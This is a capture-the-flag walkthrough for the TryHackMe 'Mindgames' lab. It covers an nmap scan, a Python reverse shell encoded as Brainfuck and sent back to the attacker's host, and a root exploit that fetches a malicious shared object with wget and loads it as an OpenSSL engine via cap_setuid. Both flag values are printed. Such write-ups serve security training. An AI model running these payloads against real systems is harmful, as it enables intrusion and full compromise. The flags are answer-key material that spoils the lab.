# Walkthrough: TryHackMe - Mindgames CTF
## Reconnaissance & Initial Access
### 1. OpenVPN Tunnel Establishment
The attacker machine established an active VPN connection to the target network via OpenVPN:
```bash
sudo openvpn ap-south-1-varunkr578-regular.ovpn
```
Network Parameters:
- Assigned Local IP: 192.168.135.130
- Target IP: 10.48.177.194

2. Nmap Port Scanning
A full TCP port and service version scan was executed against ```10.48.177.194```:
```bash
nmap -sV -sC -p- 10.48.177.194
```
Scan Results:

| Port   | State | Service | Version / Info                                           |
| :---   | :---  | :---    | :---                                                     |
| 22/tcp | Open  | SSH     |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3                           |
| 80/tcp | Open  | HTTP    |Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |

---

## Web Application Enumeration & Esoteric Code Analysis
### 3. Web Application Analysis
Navigating to ```[http://10.48.177.194](http://10.48.177.194)``` reveals a web application titled Mindgames that features an online code execution interface ("Try before you buy").

The page displays example code snippets consisting of sequences of esoteric operators (e.g., +, -, >, <, [, ], ., ,).

### 4. Esoteric Language Identification & Decoding
To identify the code dialect, sample strings were analyzed using online cipher tools:
- Cipher Identification: Identified as Brainfuck.
- Hello World Analysis: Interpreting the provided sample string yields ```print("Hello, World!")```.
- Fibonacci Code Execution: Executing the default sample outputted Fibonacci numbers ```(1, 1, 2, 3, 5, 8, 13, 21, 34, 55)```.
This confirms the backend server decodes the Brainfuck input, converts it into Python code, and executes it dynamically.

---

## Payload Encoding & Reverse Shell Delivery
### 5. Reverse Shell Generation
To achieve remote code execution, a Python 3 reverse shell payload was generated via ```revshells.com```:
```bash
import os,pty,socket;s=socket.socket();s.connect(("192.168.135.130",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")
```
### 6. Payload Encoding to Brainfuck
The Python reverse shell string was passed through a Brainfuck encoder to convert the raw command into executable Brainfuck syntax.
Encoded String Excerpt:
```bash
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>++++.+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>+++++++.
```
### 7. Netcat Listener & Command Execution
A Netcat listener was initialized on the attacker machine on port ```443```:
```bash
nc -lvnp 443
```
Submitting the encoded Brainfuck payload into the web form triggered execution on the target server, establishing a reverse shell connection from ```10.48.177.194``` back to ```192.168.135.130:443```.

---

## Enumeration, Exploitation & Privilege Escalation
## Shell Stabilization & User Flag Extraction
### 8. Interactive Shell Stabilization
Upon receiving the low-privilege reverse connection as user ```mindgames```, an interactive TTY shell was spawned using Python 3:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
9. User Flag Retrieval
Navigating to the home directory of user ```mindgames``` reveals the first target flag:
```bash
cd /home/mindgames
cat user.txt
```
User Flag:
```bash
thm{411f7d38247ff441ce4e134b459b6268}
```
---

## Local Enumeration & Capability Abuse
10. LinPEAS Deployment & Capability Inspection
To identify local privilege escalation vectors, ```linpeas.sh``` was hosted on the attacker machine via ```python3 -m http.server 8080```, transferred to ```/tmp```, and executed.
The automated audit highlighted binary capabilities on the target system:
```bash
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```
- Vulnerability: ```/usr/bin/openssl``` possesses the ```cap_setuid+ep```   capability. This permits OpenSSL to change its Effective User ID (EUID) to ```root``` (UID 0) without running via ```sudo``` or standard SUID bits.

---

## OpenSSL Engine Hijacking & Privilege Escalation
### 11. Malicious Shared Object (.so) Compilation
To leverage the ```cap_setuid``` capability on OpenSSL, a custom C payload (```root.c```) was written on the attacker host to elevate privileges and execute a root shell when loaded:
```bash
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

extern char **environ;

void _init(void)
{
    setgid(0);
    setuid(0);
    execve("/bin/sh", (char *[]){"sh", NULL}, environ);
}
```
Compile the source code into a shared object file (root.so):
```bash
gcc -Wall -fPIC -c root.c
ld -shared -Bdynamic root.o -L/lib -lc -o root.so
```
### 12. Payload Transfer & Root Execution
Host ```root.so``` on Kali Linux using ```python3 -m http.server 8080``` and download it to the target host's ```/tmp``` directory:
```bash
cd /tmp
wget http://192.168.135.130:8080/root.so
```
Execute OpenSSL while loading the malicious shared object as an engine:
```bash
openssl req -engine ./root.so
```
- Because OpenSSL runs with ```cap_setuid+ep```, the constructor function (```_init()```) inside ```root.so``` executes with uid=0(root).

---

## Root Flag Extraction
### 13. Root Flag Retrieval
With an interactive root shell spawned ```(#)```, navigate to the ```/root``` directory to read the final flag:
```bash
id
cd /root
cat root.txt
```
Target Compromise Summary:
- Effective User: uid=0(root) gid=1001(mindgames)
- Root Flag:
```bash
thm{1974a617cc84c5b51411c283544ee254}
```
